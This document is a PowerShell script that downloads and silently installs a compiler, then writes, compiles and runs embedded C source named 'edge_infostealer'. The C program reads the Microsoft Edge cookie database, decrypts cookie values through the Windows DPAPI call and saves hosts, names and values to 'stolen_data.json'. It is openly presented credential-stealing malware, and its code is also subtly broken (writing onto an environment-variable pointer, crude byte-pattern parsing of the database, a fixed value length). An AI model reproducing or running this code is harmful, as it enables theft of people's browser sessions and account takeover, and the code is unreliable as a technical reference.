# Define the URL for w64devkit
$w64devkitUrl = "https://github.com/skeeto/w64devkit/releases/download/v2.0.0/w64devkit-x86-2.0.0.exe"
$w64devkitExe = "w64devkit-x86-2.0.0.exe"
$w64devkitDir = "w64devkit"

# Download w64devkit
Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe

# Run the w64devkit installer
Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait

# Define the C program
$cProgram = @"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len) {
    DATA_BLOB DataIn;
    DATA_BLOB DataOut;
    char* decrypted_value = NULL;

    DataIn.pbData = (BYTE*)encrypted_value;
    DataIn.cbData = encrypted_len;

    if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        decrypted_value = (char*)malloc(DataOut.cbData + 1);
        memcpy(decrypted_value, DataOut.pbData, DataOut.cbData);
        decrypted_value[DataOut.cbData] = '\0';
        LocalFree(DataOut.pbData);
    }

    return decrypted_value;
}

void read_edge_cookies() {
    const char* db_path = getenv("LOCALAPPDATA");
    strcat(db_path, "\\Microsoft\\Edge\\User Data\\Default\\Cookies");

    FILE* file = fopen(db_path, "rb");
    if (!file) {
        printf("Failed to open cookies file.\n");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(file_size);
    fread(buffer, 1, file_size, file);
    fclose(file);

    FILE* output_file = fopen("stolen_data.json", "w");
    if (output_file) {
        fprintf(output_file, "[\n");
        int first = 1;
        for (long i = 0; i < file_size; i++) {
            if (buffer[i] == 0x00 && buffer[i + 1] == 0x00 && buffer[i + 2] == 0x00 && buffer[i + 3] == 0x00) {
                const char* host_key = (const char*)&buffer[i + 4];
                const char* name = (const char*)&buffer[i + 20];
                const unsigned char* encrypted_value = &buffer[i + 40];
                int encrypted_len = 16;

                char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
                if (decrypted_value) {
                    if (!first) {
                        fprintf(output_file, ",\n");
                    }
                    first = 0;
                    fprintf(output_file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
                    free(decrypted_value);
                }
            }
        }
        fprintf(output_file, "\n]\n");
        fclose(output_file);
        printf("Data saved locally at stolen_data.json\n");
    }

    free(buffer);
}

int main() {
    read_edge_cookies();
    return 0;
}
"@

# Save the C program to a file
$cProgramPath = "edge_infostealer.c"
Set-Content -Path $cProgramPath -Value $cProgram

# Compile the C program using w64devkit
$w64devkitBin = "C:\w64devkit\bin"
$gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32"
Invoke-Expression $compileCommand

# Run the compiled executable
$exePath = ".\edge_infostealer.exe"
Invoke-Expression $exePath
